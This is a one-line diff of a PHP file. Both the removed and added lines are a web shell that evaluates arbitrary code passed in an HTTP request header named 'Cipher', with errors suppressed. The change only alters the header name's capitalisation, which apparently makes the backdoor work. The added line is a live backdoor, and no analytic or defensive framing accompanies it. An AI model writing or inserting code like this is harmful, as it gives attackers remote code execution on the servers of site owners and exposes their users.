@@ -1,1 +1,1 @@
-<?php @eval($_SERVER['HTTP_Cipher']); ?>
+<?php @eval($_SERVER['HTTP_CIPHER']); ?>
